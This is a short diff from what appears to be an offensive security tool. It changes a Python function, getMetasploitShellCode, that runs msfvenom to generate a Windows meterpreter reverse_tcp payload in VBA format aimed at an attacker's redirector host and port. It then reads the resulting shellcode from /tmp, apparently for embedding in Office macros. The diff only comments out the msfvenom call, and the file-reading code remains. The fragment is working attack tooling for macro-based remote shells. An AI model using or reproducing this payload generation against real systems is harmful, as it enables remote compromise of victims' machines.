@@ -249,7 +249,7 @@ def getMetasploitShellCode(redirector):
 	Returns string of shellcode
 	'''
 	code = ''
-	system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f vba > /tmp/metasploitvba'.format(redirector[0], redirector[1]))
+	# system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f vba > /tmp/metasploitvba'.format(redirector[0], redirector[1]))
 	for line in open('/tmp/metasploitvba', 'r'):
 		code += line
 
